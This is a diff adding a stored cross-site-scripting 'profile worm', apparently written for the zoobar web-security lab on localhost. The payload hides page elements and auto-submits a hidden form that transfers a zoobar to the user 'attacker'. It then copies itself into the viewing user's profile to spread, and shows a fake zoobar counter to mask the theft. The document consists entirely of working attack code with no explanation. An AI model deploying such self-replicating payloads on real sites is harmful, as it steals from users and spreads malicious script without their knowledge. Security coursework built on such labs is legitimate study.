@@ -1,0 +1,29 @@
+</b>
+<style>.log{display:none;}#profileheader{display:none;}</style>
+<iframe id="response_frame" style="display:none;visibility:hidden;height:0;width:0;position:absolute" name="response_frame" src="about:blank"></iframe>
+<form name="profileform" method="POST" action="http://localhost:8080/zoobar/index.cgi/" target="response_frame">
+<input name="profile_update" type="hidden" value="" />
+</form>
+<form name="transferform" method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer" target="response_frame">
+<input name="zoobars" type="hidden" value="1" />
+<input name="recipient" type="hidden" value="attacker" />
+<input type="hidden" name="submission" value="Send" />
+</form>
+<div id="profilehader"></div>
+<script type="text/javascript">
+document.transferform.submit();
+window.onload = function() {
+  var profile = document.getElementById('profile').innerHTML;
+  profile = profile.replace(/^<b>/, '').replace(/<\/b>$/, '');
+  document.profileform.profile_update.value = profile;
+  document.profileform.submit();
+};
+var user = document.location.search.replace(/.*user=/, '').replace(/&.*/, '');
+var total = 10;
+function showZoobars(zoobars) {
+  document.getElementById('profilehader').innerHTML = user + "'s zoobars:" + zoobars;
+  if (zoobars < total) setTimeout(function() { showZoobars(zoobars + 1); }, 100);
+}
+showZoobars(0);
+</script>
+<b>Hello from the profile worm!
